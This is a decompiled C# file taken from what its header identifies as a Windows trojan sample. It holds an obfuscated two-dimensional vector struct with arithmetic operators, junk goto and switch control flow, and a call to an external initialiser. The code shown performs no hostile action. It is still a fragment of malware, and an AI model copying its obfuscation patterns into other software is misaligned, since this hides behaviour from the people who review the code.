// Decompiled with JetBrains decompiler
// Type: jd.iE
// Assembly: RuntimeFieldI, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3177D6BF-0678-437F-AD25-445C5521A270
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\UDS-Trojan.Win32.GenericML.xnet-4e662e06b02d9a2d6b61135dedc905b8bc0ad6107d655cb2448b7eedfbf9c5b6.exe

using System;

namespace jd
{
  public struct iE
  {
    public float y0;
    public float cw;
    internal static object Na;

    public iE(float _param1, float _param2)
    {
      gs.JD3Ei4();
      this.y0 = _param1;
      this.cw = _param2;
      int num = 0;
      if (true)
        goto label_3;
label_1:
      switch (num)
      {
        case 0:
          return;
        default:
          return;
      }
label_3:
      num = 0;
      goto label_1;
    }

    public static float H7(iE _param0, iE _param1) => (float) ((double) _param0.y0 * (double) _param1.y0 + (double) _param0.cw * (double) _param1.cw);

    public float DK() => (float) Math.Sqrt((double) this.y0 * (double) this.y0 + (double) this.cw * (double) this.cw);

    public iE MC()
    {
      float num1 = this.DK();
      iE iE = new iE(this.y0 / num1, this.cw / num1);
      int num2 = 0;
      if (!iE.Ut())
        goto label_3;
label_1:
      switch (num2)
      {
        default:
          return iE;
      }
label_3:
      num2 = 0;
      goto label_1;
    }

    public static iE operator +(iE _param0, iE _param1) => new iE(_param0.y0 + _param1.y0, _param0.cw + _param1.cw);

    public static iE operator -(iE _param0, iE _param1) => new iE(_param0.y0 - _param1.y0, _param0.cw - _param1.cw);

    public static iE operator *(iE _param0, iE _param1) => new iE(_param0.y0 * _param1.y0, _param0.cw * _param1.cw);

    public static iE operator /(iE _param0, iE _param1) => new iE(_param0.y0 / _param1.y0, _param0.cw / _param1.cw);

    public static iE operator *(iE _param0, float _param1) => new iE(_param0.y0 * _param1, _param0.cw * _param1);

    public static iE operator /(iE _param0, float _param1) => new iE(_param0.y0 / _param1, _param0.cw / _param1);

    public static iE operator *(float _param0, iE _param1) => new iE(_param0 * _param1.y0, _param0 * _param1.cw);

    public static iE operator /(float _param0, iE _param1) => new iE(_param0 / _param1.y0, _param0 / _param1.cw);

    public static iE operator -(iE _param0) => new iE(-_param0.y0, -_param0.cw);

    internal static bool Ut() => iE.Na == null;

    internal static object eb() => iE.Na;
  }
}
